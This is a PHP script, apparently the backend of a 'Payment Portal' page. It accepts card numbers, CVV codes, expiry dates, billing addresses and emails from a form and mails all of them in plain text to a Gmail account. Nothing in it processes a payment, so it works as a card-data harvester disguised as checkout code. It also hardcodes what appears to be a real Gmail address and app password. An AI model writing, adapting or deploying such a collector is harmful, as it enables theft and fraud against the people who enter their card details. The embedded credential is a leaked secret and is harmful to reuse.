<?php
// Include PHPMailer classes
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'vendor/autoload.php'; // Adjust this path if PHPMailer is installed elsewhere

// Ensure the script only processes POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405); // Method Not Allowed
    echo json_encode(["error" => "Invalid request method"]);
    exit;
}

// Get the raw POST data
$requestBody = file_get_contents('php://input');
$data = json_decode($requestBody, true);

// Validate JSON decoding
if (json_last_error() !== JSON_ERROR_NONE) {
    http_response_code(400); // Bad Request
    echo json_encode(["error" => "Invalid JSON data"]);
    exit;
}

// Extract and validate required fields
$requiredFields = ['expYear', 'email', 'name', 'amount', 'cvv', 'cardNumber', 'expMonth', 'zipCode', 'state', 'city', 'address'];
foreach ($requiredFields as $field) {
    if (empty($data[$field])) {
        http_response_code(400); // Bad Request
        echo json_encode(["error" => "Missing field: $field"]);
        exit;
    }
}

// Sanitize data
$expYear = htmlspecialchars($data['expYear'], ENT_QUOTES, 'UTF-8');
$email = filter_var($data['email'], FILTER_SANITIZE_EMAIL);
$name = htmlspecialchars($data['name'], ENT_QUOTES, 'UTF-8');
$amount = htmlspecialchars($data['amount'], ENT_QUOTES, 'UTF-8');
$cvv = htmlspecialchars($data['cvv'], ENT_QUOTES, 'UTF-8');
$cardNumber = htmlspecialchars($data['cardNumber'], ENT_QUOTES, 'UTF-8');
$expMonth = htmlspecialchars($data['expMonth'], ENT_QUOTES, 'UTF-8');
$zipCode = htmlspecialchars($data['zipCode'], ENT_QUOTES, 'UTF-8');
$state = htmlspecialchars($data['state'], ENT_QUOTES, 'UTF-8');
$city = htmlspecialchars($data['city'], ENT_QUOTES, 'UTF-8');
$address = htmlspecialchars($data['address'], ENT_QUOTES, 'UTF-8');

// Create email content
$message = "
    <h1>Payment Details</h1>
    <p><strong>Name:</strong> $name</p>
    <p><strong>Email:</strong> $email</p>
    <p><strong>Amount:</strong> $amount</p>
    <p><strong>Card Number:</strong> $cardNumber</p>
    <p><strong>CVV:</strong> $cvv</p>
    <p><strong>Expiration Date:</strong> $expMonth/$expYear</p>
    <p><strong>Address:</strong> $address</p>
    <p><strong>City:</strong> $city</p>
    <p><strong>State:</strong> $state</p>
    <p><strong>ZIP Code:</strong> $zipCode</p>
";

$mail = new PHPMailer(true);

try {
    // SMTP Server Configuration
    $mail->isSMTP();
    $mail->Host = 'smtp.gmail.com'; // Replace with your SMTP host
    $mail->SMTPAuth = true;
    $mail->Username = 'americanresidence435@gmail.com'; // Replace with your SMTP username
    $mail->Password = 'dtwh cnul jqfq uxol'; // Replace with your SMTP password
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
    $mail->Port = 587; // Common SMTP port

    // Email Headers
    $mail->setFrom('americanresidence435@gmail.com', 'Payment Portal'); // Replace with your sender email
    $mail->addAddress('americanresidence435@gmail.com', 'Resido'); // Replace with the recipient's email

    // Email Content
    $mail->isHTML(true);
    $mail->Subject = 'Payment Information Submitted';
    $mail->Body    = $message;

    // Send the email
    $mail->send();
    http_response_code(200); // OK
    echo json_encode(["success" => "Email sent successfully"]);
} catch (Exception $e) {
    http_response_code(500); // Internal Server Error
    echo json_encode(["error" => "Message could not be sent. Mailer Error: {$mail->ErrorInfo}"]);
}

exit;
